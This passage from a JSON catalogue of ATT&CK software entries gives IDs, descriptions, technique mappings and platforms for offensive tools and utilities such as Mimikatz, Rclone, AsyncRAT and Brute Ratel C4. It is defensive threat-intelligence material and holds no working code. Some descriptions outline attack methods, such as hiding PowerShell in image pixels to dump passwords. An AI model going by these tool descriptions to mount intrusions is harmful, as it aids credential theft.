        "T1053.005",
        "T1553.002",
        "T1105",
        "T1036.004",
        "T1071.001",
        "T1204.002",
        "T1548.002",
        "T1497.001",
        "T1027.002",
        "T1070"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0527",
      "stix_id": "tool--5256c0f8-9108-4c92-8b09-482dfacdcd94",
      "created": "2020-11-09T14:30:35.202000+00:00",
      "modified": "2025-04-16T20:38:52.033000+00:00"
    },
    "S1040": {
      "id": "S1040",
      "name": "Rclone",
      "description": "[Rclone](https://attack.mitre.org/software/S1040) is a command line program for syncing files with cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA. [Rclone](https://attack.mitre.org/software/S1040) has been used in a number of ransomware campaigns, including those associated with the [Conti](https://attack.mitre.org/software/S0575) and DarkSide Ransomware-as-a-Service operations.(Citation: Rclone)(Citation: Rclone Wars)(Citation: Detecting Rclone)(Citation: DarkSide Ransomware Gang)(Citation: DFIR Conti Bazar Nov 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1567.002",
        "T1083",
        "T1030",
        "T1560.001",
        "T1048.002",
        "T1048.003"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S1040",
      "stix_id": "tool--59096109-a1dd-463b-87e7-a8d110fe3a79",
      "created": "2022-08-30T13:02:36.422000+00:00",
      "modified": "2024-04-04T03:50:32.975000+00:00"
    },
    "S0179": {
      "id": "S0179",
      "name": "MimiPenguin",
      "description": "[MimiPenguin](https://attack.mitre.org/software/S0179) is a credential dumper, similar to [Mimikatz](https://attack.mitre.org/software/S0002), designed specifically for Linux platforms. (Citation: MimiPenguin GitHub May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.007"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0179",
      "stix_id": "tool--5a33468d-844d-4b1f-98c9-0e786c556b27",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:45:19.566000+00:00"
    },
    "S0108": {
      "id": "S0108",
      "name": "netsh",
      "description": "[netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact with networking components on local or remote systems. (Citation: TechNet Netsh)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.004",
        "T1546.007",
        "T1090",
        "T1518.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0108",
      "stix_id": "tool--5a63f900-5e7e-4928-a746-dd4558e1df71",
      "created": "2017-05-31T21:33:06.083000+00:00",
      "modified": "2025-02-25T17:54:17.038000+00:00"
    },
    "S0465": {
      "id": "S0465",
      "name": "CARROTBALL",
      "description": "[CARROTBALL](https://attack.mitre.org/software/S0465) is an FTP downloader utility that has been in use since at least 2019. [CARROTBALL](https://attack.mitre.org/software/S0465) has been used as a downloader to install [SYSCON](https://attack.mitre.org/software/S0464).(Citation: Unit 42 CARROTBAT January 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.002",
        "T1105",
        "T1204.002",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0465",
      "stix_id": "tool--5fc81b43-62b5-41b1-9113-c79ae5f030c4",
      "created": "2020-06-02T19:10:29.513000+00:00",
      "modified": "2025-04-25T14:45:20.112000+00:00"
    },
    "S0190": {
      "id": "S0190",
      "name": "BITSAdmin",
      "description": "[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1570",
        "T1048.003",
        "T1105",
        "T1197"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0190",
      "stix_id": "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:52.586000+00:00"
    },
    "S0175": {
      "id": "S0175",
      "name": "meek",
      "description": "[meek](https://attack.mitre.org/software/S0175) is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.004"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0175",
      "stix_id": "tool--65370d0b-3bd4-4653-8cf9-daf56f6be830",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:45:20.648000+00:00"
    },
    "S1087": {
      "id": "S1087",
      "name": "AsyncRAT",
      "description": "[AsyncRAT](https://attack.mitre.org/software/S1087) is an open-source remote access tool originally available through the NYANxCAT Github repository that has been used in malicious campaigns.(Citation: Morphisec Snip3 May 2021)(Citation: Cisco Operation Layover September 2021)(Citation: Telefonica Snip3 December 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1622",
        "T1106",
        "T1082",
        "T1033",
        "T1568",
        "T1564.003",
        "T1497.001",
        "T1125",
        "T1105",
        "T1057",
        "T1113",
        "T1056.001",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1087",
      "stix_id": "tool--6a5947f3-1a36-4653-8734-526df3e1d28d",
      "created": "2023-09-20T17:32:59.932000+00:00",
      "modified": "2023-10-10T17:19:12.868000+00:00"
    },
    "S0684": {
      "id": "S0684",
      "name": "ROADTools",
      "description": "[ROADTools](https://attack.mitre.org/software/S0684) is a framework for enumerating Azure Active Directory environments. The tool is written in Python and publicly available on GitHub.(Citation: ROADtools Github)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1018",
        "T1119",
        "T1526",
        "T1087.004",
        "T1069.003",
        "T1078.004"
      ],
      "platforms": [
        "Identity Provider"
      ],
      "url": "https://attack.mitre.org/software/S0684",
      "stix_id": "tool--6dbdc657-d8e0-4f2f-909b-7251b3e72c6d",
      "created": "2022-02-18T13:29:23.577000+00:00",
      "modified": "2024-09-16T17:02:37.377000+00:00"
    },
    "S1063": {
      "id": "S1063",
      "name": "Brute Ratel C4",
      "description": "[Brute Ratel C4](https://attack.mitre.org/software/S1063) is a commercial red-teaming and adversarial attack simulation tool that first appeared in December 2020. [Brute Ratel C4](https://attack.mitre.org/software/S1063) was specifically designed to avoid detection by endpoint detection and response (EDR) and antivirus (AV) capabilities, and deploys agents called badgers to enable arbitrary command execution for lateral movement, privilege escalation, and persistence. In September 2022, a cracked version of [Brute Ratel C4](https://attack.mitre.org/software/S1063) was leaked in the cybercriminal underground, leading to its use by threat actors.(Citation: Dark Vortex Brute Ratel C4)(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)(Citation: SANS Brute Ratel October 2022)(Citation: Trend Micro Black Basta October 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.002",
        "T1569.002",
        "T1059.003",
        "T1021.006",
        "T1113",
        "T1057",
        "T1027",
        "T1047",
        "T1036.005",
        "T1021.002",
        "T1005",
        "T1140",
        "T1069.002",
        "T1572",
        "T1518.001",
        "T1562.006",
        "T1036.008",
        "T1087.002",
        "T1021",
        "T1620",
        "T1046",
        "T1482",
        "T1106",
        "T1102",
        "T1071.004",
        "T1095",
        "T1105",
        "T1027.007",
        "T1497.003",
        "T1574.001",
        "T1558.003",
        "T1204.002",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1063",
      "stix_id": "tool--75d8b521-6b6a-42ff-8af3-d97e20ce12a5",
      "created": "2023-02-07T20:26:58.792000+00:00",
      "modified": "2024-09-19T15:46:58.008000+00:00"
    },
    "S0683": {
      "id": "S0683",
      "name": "Peirates",
      "description": "[Peirates](https://attack.mitre.org/software/S0683) is a post-exploitation Kubernetes exploitation framework with a focus on gathering service account tokens for lateral movement and privilege escalation. The tool is written in GoLang and publicly available on GitHub.(Citation: Peirates GitHub)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1613",
        "T1609",
        "T1611",
        "T1550.001",
        "T1530",
        "T1046",
        "T1610",
        "T1552.007",
        "T1619",
        "T1552.005",
        "T1528",
        "T1078.004"
      ],
      "platforms": [
        "Containers"
      ],
      "url": "https://attack.mitre.org/software/S0683",
      "stix_id": "tool--79dd477a-8226-4b3d-ad15-28623675f221",
      "created": "2022-02-08T16:11:38.528000+00:00",
      "modified": "2025-04-16T20:38:52.924000+00:00"
    },
    "S0332": {
      "id": "S0332",
      "name": "Remcos",
      "description": "[Remcos](https://attack.mitre.org/software/S0332) is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security. [Remcos](https://attack.mitre.org/software/S0332) has been observed being used in malware campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1115",
        "T1055",
        "T1059.006",
        "T1090",
        "T1112",
        "T1027",
        "T1497.001",
        "T1059.003",
        "T1548.002",
        "T1113",
        "T1105",
        "T1056.001",
        "T1125",
        "T1083",
        "T1123"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0332",
      "stix_id": "tool--7cd0bc75-055b-4098-a00e-83dc8beaff14",
      "created": "2019-01-29T18:55:20.245000+00:00",
      "modified": "2025-04-16T20:38:53.082000+00:00"
    },
    "S0096": {
      "id": "S0096",
      "name": "Systeminfo",
      "description": "[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0096",
      "stix_id": "tool--7fcbc4e8-1989-441f-9ac5-e7b6ff5806f1",
      "created": "2017-05-31T21:33:00.969000+00:00",
      "modified": "2025-04-16T20:38:53.231000+00:00"
    },
    "S0594": {
      "id": "S0594",
      "name": "Out1",
      "description": "[Out1](https://attack.mitre.org/software/S0594) is a remote access tool written in python and used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021.(Citation: Trend Micro Muddy Water March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1027",
        "T1059.003",
        "T1005",
        "T1114.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0594",
      "stix_id": "tool--80c815bb-b24a-4b9c-9d73-ff4c075a278d",
      "created": "2021-03-19T13:11:50.666000+00:00",
      "modified": "2025-04-25T14:45:22.072000+00:00"
    },
    "S0591": {
      "id": "S0591",
      "name": "ConnectWise",
      "description": "[ConnectWise](https://attack.mitre.org/software/S0591) is a legitimate remote administration tool that has been used since at least 2016 by threat actors including [MuddyWater](https://attack.mitre.org/groups/G0069) and [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) to connect to and conduct lateral movement in target environments.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1125",
        "T1059.001",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0591",
      "stix_id": "tool--842976c7-f9c8-41b2-8371-41dc64fbe261",
      "created": "2021-03-18T13:39:27.676000+00:00",
      "modified": "2025-04-16T20:38:53.716000+00:00"
    },
    "S1176": {
      "id": "S1176",
      "name": "attrib",
      "description": "[attrib](https://attack.mitre.org/software/S1176) is a Windows utility used to display, set or remove attributes assigned to files or directories.(Citation: Microsoft attrib 2023) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1176",
      "stix_id": "tool--8c6e9947-f7b1-4bd3-9d5d-cc7d39934989",
      "created": "2024-12-04T15:47:07.382000+00:00",
      "modified": "2025-01-02T21:29:42.017000+00:00"
    },
    "S0434": {
      "id": "S0434",
      "name": "Imminent Monitor",
      "description": "[Imminent Monitor](https://attack.mitre.org/software/S0434) was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.(Citation: Imminent Unit42 Dec2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1555.003",
        "T1140",
        "T1056.001",
        "T1070.004",
        "T1021.001",
        "T1057",
        "T1059",
        "T1125",
        "T1564.001",
        "T1496.001",
        "T1041",
        "T1123",
        "T1027",
        "T1083",
        "T1562.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0434",
      "stix_id": "tool--8f8cd191-902c-4e83-bf20-b57c8c4640e9",
      "created": "2020-05-05T18:45:36.358000+00:00",
      "modified": "2023-10-03T19:35:03.646000+00:00"
    },
    "S0358": {
      "id": "S0358",
      "name": "Ruler",
      "description": "[Ruler](https://attack.mitre.org/software/S0358) is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of [Ruler](https://attack.mitre.org/software/S0358) have also released a defensive tool, NotRuler, to detect its usage.(Citation: SensePost Ruler GitHub)(Citation: SensePost NotRuler)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1137.005",
        "T1137.003",
        "T1137.004",
        "T1087.003"
      ],
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "url": "https://attack.mitre.org/software/S0358",
      "stix_id": "tool--90ac9266-68ce-46f2-b24f-5eb3b2a8ea38",
      "created": "2019-02-04T18:27:00.501000+00:00",
      "modified": "2025-04-25T14:45:22.953000+00:00"
    },
    "S0193": {
      "id": "S0193",
      "name": "Forfiles",
      "description": "[Forfiles](https://attack.mitre.org/software/S0193) is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. (Citation: Microsoft Forfiles Aug 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1202",
        "T1005",
        "T1083"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0193",
      "stix_id": "tool--90ec2b22-7061-4469-b539-0989ec4f96c2",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:45:23.318000+00:00"
    },
    "S0191": {
      "id": "S0191",
      "name": "Winexe",
      "description": "[Winexe](https://attack.mitre.org/software/S0191) is a lightweight, open source tool similar to [PsExec](https://attack.mitre.org/software/S0029) designed to allow system administrators to execute commands on remote servers. (Citation: Winexe Github Sept 2013) [Winexe](https://attack.mitre.org/software/S0191) is unique in that it is a GNU/Linux based client. (Citation: \u00dcberwachung APT28 Forfiles June 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1569.002"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0191",
      "stix_id": "tool--96fd6cc4-a693-4118-83ec-619e5352d07d",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-09-04T21:09:10.255000+00:00"
    },
    "S0500": {
      "id": "S0500",
      "name": "MCMD",
      "description": "[MCMD](https://attack.mitre.org/software/S0500) is a remote access tool that provides remote command shell capability used by [Dragonfly 2.0](https://attack.mitre.org/groups/G0074).(Citation: Secureworks MCMD July 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.009",
        "T1059.003",
        "T1564.003",
        "T1071.001",
        "T1036.005",
        "T1027",
        "T1053.005",
        "T1005",
        "T1105",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0500",
      "stix_id": "tool--975737f1-b10d-476f-8bda-3ec26ea57172",
      "created": "2020-08-13T17:15:25.702000+00:00",
      "modified": "2025-04-16T20:38:54.178000+00:00"
    },
    "S0359": {
      "id": "S0359",
      "name": "Nltest",
      "description": "[Nltest](https://attack.mitre.org/software/S0359) is a Windows command-line utility used to list domain controllers and enumerate domain trusts.(Citation: Nltest Manual)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1482",
        "T1018",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0359",
      "stix_id": "tool--981acc4c-2ede-4b56-be6e-fa1a75f37acf",
      "created": "2019-02-14T17:08:55.176000+00:00",
      "modified": "2024-09-25T20:27:04.356000+00:00"
    },
    "S0413": {
      "id": "S0413",
      "name": "MailSniper",
      "description": "MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.(Citation: GitHub MailSniper)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1114.002",
        "T1110.003",
        "T1087.003"
      ],
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "url": "https://attack.mitre.org/software/S0413",
      "stix_id": "tool--999c4e6e-b8dc-4b4f-8d6e-1b829f29997e",
      "created": "2019-10-05T02:34:01.189000+00:00",
      "modified": "2024-10-14T22:11:30.271000+00:00"
    },
    "S0225": {
      "id": "S0225",
      "name": "sqlmap",
      "description": "[sqlmap](https://attack.mitre.org/software/S0225) is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. (Citation: sqlmap Introduction)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1190"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0225",
      "stix_id": "tool--9a2640c2-9f43-46fe-b13f-bde881e55555",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:45:24.383000+00:00"
    },
    "S0006": {
      "id": "S0006",
      "name": "pwdump",
      "description": "[pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: Wikipedia pwdump)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0006",
      "stix_id": "tool--9de2308e-7bed-43a3-8e58-f194b3586700",
      "created": "2017-05-31T21:32:13.051000+00:00",
      "modified": "2025-04-25T14:45:24.744000+00:00"
    },
    "S0174": {
      "id": "S0174",
      "name": "Responder",
      "description": "Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (Citation: GitHub Responder)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1040",
        "T1557.001"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0174",
      "stix_id": "tool--a1dd2dbd-1550-44bf-abcc-1a4c52e97719",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-16T20:38:54.639000+00:00"
    },
    "S0122": {
      "id": "S0122",
      "name": "Pass-The-Hash Toolkit",
      "description": "[Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1550.002"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0122",
      "stix_id": "tool--a52edc76-328d-4596-85e7-d56ef5a9eb69",
      "created": "2017-05-31T21:33:11.426000+00:00",
      "modified": "2025-04-25T14:45:25.272000+00:00"
    },
    "S0695": {
      "id": "S0695",
      "name": "Donut",
      "description": "[Donut](https://attack.mitre.org/software/S0695) is an open source framework used to generate position-independent shellcode.(Citation: Donut Github)(Citation: Introducing Donut) [Donut](https://attack.mitre.org/software/S0695) generated code has been used by multiple threat actors to inject and load malicious payloads into memory.(Citation: NCC Group WastedLocker June 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070",
        "T1059.006",
        "T1055",
        "T1059",
        "T1059.005",
        "T1027.013",
        "T1057",
        "T1027.002",
        "T1071.001",
        "T1059.007",
        "T1106",
        "T1620",
        "T1027.015",
        "T1059.001",
        "T1105",
        "T1562.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0695",
      "stix_id": "tool--a7b5df47-73bb-4d47-b701-869f185633a6",
      "created": "2022-03-25T13:35:46.781000+00:00",
      "modified": "2025-04-16T20:38:54.932000+00:00"
    },
    "S0002": {
      "id": "S0002",
      "name": "Mimikatz",
      "description": "[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.006",
        "T1555",
        "T1207",
        "T1552.004",
        "T1134.005",
        "T1547.005",
        "T1550.002",
        "T1098",
        "T1550.003",
        "T1555.003",
        "T1558.001",
        "T1003.002",
        "T1003.001",
        "T1558.002",
        "T1555.004",
        "T1649",
        "T1003.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0002",
      "stix_id": "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60",
      "created": "2017-05-31T21:32:11.544000+00:00",
      "modified": "2024-11-27T21:53:57.705000+00:00"
    },
    "S0008": {
      "id": "S0008",
      "name": "gsecdump",
      "description": "[gsecdump](https://attack.mitre.org/software/S0008) is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. (Citation: TrueSec Gsecdump)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.002",
        "T1003.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0008",
      "stix_id": "tool--b07c2c47-fefb-4d7c-a69e-6a3296171f54",
      "created": "2017-05-31T21:32:13.755000+00:00",
      "modified": "2024-11-17T23:49:27.288000+00:00"
    },
    "S0581": {
      "id": "S0581",
      "name": "IronNetInjector",
      "description": "[IronNetInjector](https://attack.mitre.org/software/S0581) is a [Turla](https://attack.mitre.org/groups/G0010) toolchain that utilizes scripts from the open-source IronPython implementation of Python with a .NET injector to drop one or more payloads including [ComRAT](https://attack.mitre.org/software/S0126).(Citation: Unit 42 IronNetInjector February 2021 )",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.006",
        "T1057",
        "T1055",
        "T1036.004",
        "T1053.005",
        "T1140",
        "T1055.001",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0581",
      "stix_id": "tool--b1595ddd-a783-482a-90e1-8afc8d48467e",
      "created": "2021-02-24T21:28:44.175000+00:00",
      "modified": "2024-04-11T02:14:36.791000+00:00"
    },
    "S0102": {
      "id": "S0102",
      "name": "nbtstat",
      "description": "[nbtstat](https://attack.mitre.org/software/S0102) is a utility used to troubleshoot NetBIOS name resolution. (Citation: TechNet Nbtstat)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1049"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0102",
      "stix_id": "tool--b35068ec-107a-4266-bda8-eb7036267aea",
      "created": "2017-05-31T21:33:03.773000+00:00",
      "modified": "2025-04-25T14:45:26.343000+00:00"
    },
    "S0231": {
      "id": "S0231",
      "name": "Invoke-PSImage",
      "description": "[Invoke-PSImage](https://attack.mitre.org/software/S0231) takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. (Citation: GitHub Invoke-PSImage)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.003",
        "T1027.009"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0231",
      "stix_id": "tool--b52d6583-14a2-4ddc-8527-87fd2142558f",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:55.222000+00:00"
    },
    "S0590": {
      "id": "S0590",
      "name": "NBTscan",
      "description": "[NBTscan](https://attack.mitre.org/software/S0590) is an open source tool that has been used by state groups to conduct internal reconnaissance within a compromised network.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)(Citation: Symantec Waterbug Jun 2019)(Citation: FireEye APT39 Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1016",
        "T1040",
        "T1046",
        "T1018"
      ],
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0590",
      "stix_id": "tool--b63970b7-ddfb-4aee-97b1-80d335e033a8",
      "created": "2021-03-17T15:26:20.015000+00:00",
      "modified": "2025-04-25T14:45:26.872000+00:00"
    },
    "S0349": {
      "id": "S0349",
      "name": "LaZagne",
      "description": "[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1552.001",
        "T1555.004",
        "T1003.004",
        "T1003.008",
        "T1555.003",
        "T1003.001",
        "T1003.005",
        "T1555",
        "T1555.001",
        "T1003.007"
      ],
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0349",
      "stix_id": "tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b",
      "created": "2019-01-30T16:44:59.887000+00:00",
      "modified": "2024-04-04T03:49:27.035000+00:00"
    },
    "S0097": {
      "id": "S0097",
      "name": "Ping",
      "description": "[Ping](https://attack.mitre.org/software/S0097) is an operating system utility commonly used to troubleshoot and verify network connections. (Citation: TechNet Ping)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1018"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0097",
      "stix_id": "tool--b77b563c-34bb-4fb8-86a3-3694338f7b47",
      "created": "2017-05-31T21:33:01.483000+00:00",
      "modified": "2025-04-16T20:38:55.518000+00:00"
    },
    "S0106": {
      "id": "S0106",
      "name": "cmd",
      "description": "[cmd](https://attack.mitre.org/software/S0106) is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. (Citation: TechNet Cmd)\n\nCmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> (Citation: TechNet Dir)), deleting files (e.g., <code>del</code> (Citation: TechNet Del)), and copying files (e.g., <code>copy</code> (Citation: TechNet Copy)).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1105",
        "T1082",
        "T1070.004",
        "T1059.003",
        "T1570"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0106",
      "stix_id": "tool--bba595da-b73a-4354-aa6c-224d4de7cb4e",
      "created": "2017-05-31T21:33:05.319000+00:00",
      "modified": "2025-04-16T20:38:55.702000+00:00"
    },
    "S0103": {
      "id": "S0103",
      "name": "route",
      "description": "[route](https://attack.mitre.org/software/S0103) can be used to find or change information within the local system IP routing table. (Citation: TechNet Route)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0103",
      "stix_id": "tool--c11ac61d-50f4-444f-85d8-6f006067f0de",
      "created": "2017-05-31T21:33:04.151000+00:00",
      "modified": "2025-04-16T20:38:55.853000+00:00"
    },
    "S0404": {
      "id": "S0404",
      "name": "esentutl",
      "description": "[esentutl](https://attack.mitre.org/software/S0404) is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.(Citation: Microsoft Esentutl)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1006",
        "T1570",
        "T1003.003",
        "T1564.004",
        "T1105",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0404",
      "stix_id": "tool--c256da91-6dd5-40b2-beeb-ee3b22ab3d27",
      "created": "2019-09-03T18:25:36.963000+00:00",
      "modified": "2023-09-28T03:45:36.045000+00:00"
    },
    "S0488": {
      "id": "S0488",
      "name": "CrackMapExec",
      "description": "[CrackMapExec](https://attack.mitre.org/software/S0488), or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks. [CrackMapExec](https://attack.mitre.org/software/S0488) collects Active Directory information to conduct lateral movement through targeted networks.(Citation: CME Github September 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.002",
        "T1003.003",
        "T1110.003",
        "T1201",
        "T1087.002",
        "T1049",
        "T1110.001",
        "T1053.002",
        "T1135",
        "T1018",
        "T1003.004",
        "T1047",
        "T1112",
        "T1083",
        "T1550.002",
        "T1082",
        "T1069.002",
        "T1059.001",
        "T1016",
        "T1110"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0488",
      "stix_id": "tool--c4810609-7da6-48ec-8057-1b70a7814db0",
      "created": "2020-07-17T14:23:05.958000+00:00",
      "modified": "2024-03-14T17:29:49.200000+00:00"
    },
    "S0250": {
      "id": "S0250",
      "name": "Koadic",
      "description": "[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool that is publicly available on GitHub. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants, and performs most of its operations using Windows Script Host.(Citation: Github Koadic)(Citation: Palo Alto Sofacy 06-2018)(Citation: MalwareBytes LazyScripter Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1082",
        "T1059.005",
        "T1218.005",
        "T1055.001",
        "T1218.010",
        "T1033",
        "T1564.003",
        "T1003.002",
        "T1105",
